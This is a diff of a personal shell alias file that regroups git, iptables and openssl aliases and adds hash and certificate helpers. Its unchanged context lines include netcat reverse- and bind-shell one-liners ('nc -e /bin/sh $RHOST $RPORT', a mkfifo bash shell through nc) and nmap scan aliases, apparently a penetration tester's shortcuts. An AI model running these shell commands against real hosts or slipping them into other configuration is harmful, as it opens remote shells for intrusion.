@@ -41,19 +41,14 @@ alias h2="history 20"
 alias h3="history 30"
 alias hgrep="history | grep"
 alias hd='hexdump -C'
-alias ipt='sudo /sbin/iptables'
 alias j='jobs -l'
 alias ckear="clear"
 alias c="clear"
 alias cl="clear"
 alias clr="clear"
 alias cls="clear"
-alias get='git'
-alias gti='git'
 alias dircount="ls -1 | wc -l"
 alias dc="dircount"
-alias sha1="openssl sha1"
-alias md5="openssl md5"
 alias xml='xmllint --format -'
 alias paux='ps aux | grep'
 alias sai="sudo apt-get install"
@@ -90,47 +85,9 @@ alias du1="du -d1"
 alias find-by-name-indir="find . -iname "
 alias find-by-name-root="find / -iname "
 
-### git ###
-alias gs='git status'
-alias gst="git status -sb"
-alias clone='git clone'
-alias merge='git merge'
-alias pull='git pull'
-alias push='git push'
-alias amend='git commit --amend '
-alias ga="git add"
-alias gc="git commit -m"
-#alias gaa="git add -A"
-alias gc="git commit -m"
-#alias gal="git add ."
-#alias gall="git add ."
-alias gc="git commit"
-alias gca="git commit -a"
-alias gcm="git commit -m"
-alias gl="git log"
-alias gfa='git fetch --all'
-#alias gbls="git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)' | sort -k5n -k2M -k3n -k4n"
-#alias gkd='git ksdiff'
-#alias glc='git log -p --follow -n 1'
-alias git-init='git config user.email tbennett6421@gmail.com && git config user.name "Tyler Bennett" && git config core.editor vim && git config diff.tool vimdiff && git config difftool.prompt false'
-alias git-revert-file="git checkout HEAD -- "
-alias git-diff-head="git diff HEAD "
-alias git-set-ssh="git remote set-url origin "
-alias gcot="git checkout"
-alias gchekout="git checkout"
-alias gchckout="git checkout"
-alias gpsh="git push -u origin"
-alias grf="git checkout HEAD -- "
-alias gstash="git stash"
-alias gw="git whatchanged"
-alias gitlg="git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
 alias gcc-dev="gcc -g -Wall -Wextra -Winline"
 alias grep_for_text="grep -inrI "
 alias header='curl -I'
-alias iptlist='sudo /sbin/iptables -L -n -v --line-numbers'
-alias iptlistin='sudo /sbin/iptables -L INPUT -n -v --line-numbers'
-alias iptlistout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
-alias iptlistfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'
 alias ls-size="ll -lAS && echo '-------------Smallest-----'"
 alias ls-time="ls -lAt && echo '-------------Oldest-----'"
 alias rsync-copy="rsync -avhP"
@@ -172,6 +129,42 @@ alias brewarm="arch -arm64 brew "
 alias brewarmi="arch -arm64 brew install"
 alias brewls="brew list"
 
+### git ###
+alias git-init='git config user.email tbennett6421@gmail.com && git config user.name "Tyler Bennett" && git config core.editor vim && git config diff.tool vimdiff && git config difftool.prompt false'
+alias git-diff-head="git diff HEAD "
+alias git-revert-file="git checkout HEAD -- "
+alias git-set-ssh="git remote set-url origin "
+alias get='git'
+alias gti='git'
+alias clone='git clone'
+alias merge='git merge'
+alias pull='git pull'
+alias push='git push'
+alias amend='git commit --amend'
+alias checkout="git checkout"
+alias stash="git stash"
+alias gs='git status'
+alias ga="git add"
+alias gc="git commit"
+alias gca="git commit -a"
+alias gcm="git commit -m"
+alias gl="git log"
+alias gfa='git fetch --all'
+alias gcot="git checkout"
+alias gchekout="git checkout"
+alias gchckout="git checkout"
+alias gpsh="git push -u origin"
+alias grf="git checkout HEAD -- "
+alias gstash="git stash"
+alias gw="git whatchanged"
+
+### iptables ### 
+alias ipt='iptables'
+alias iptlist='iptables -L -n -v --line-numbers'
+alias iptlistin='iptables -L INPUT -n -v --line-numbers'
+alias iptlistout='iptables -L OUTPUT -n -v --line-numbers'
+alias iptlistfw='iptables -L FORWARD -n -v --line-numbers'
+
 ### nc ### 
 alias nc-trad-rev='nc -e /bin/sh $RHOST $RPORT'
 alias nc-trad-bind='nc -e /bin/sh -l $LPORT'
@@ -186,6 +179,14 @@ alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -
 alias nmap-quick='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -F -oA $RHOST"_nmap_quick"'
 alias nmap-full='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -p- -O -oA $RHOST"_nmap_full"'
 alias nmap-udp='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sU --top-ports 20 -O -oA $RHOST"_nmap_udp"'
+
+### openssl ###
+alias md5="openssl md5"
+alias sha1="openssl sha1"
+alias sha256="openssl sha256"
+alias sha512="openssl sha512"
+alias x509-details="openssl x509 -text -in "
+alias rsa-to-pub="openssl rsa -pubout -out - -in "
 
 ### pip ###
 alias pipr="pip install -r requirements.txt"
@@ -233,6 +234,8 @@ alias sa="screen-attach"
 alias sl="screen-list"
 alias sls="screen-list"
 alias sn="screen-new"
+
+### tcpdump ###
 
 ### tmux ###
 alias tmux-list-sessions="tmux list-sessions"
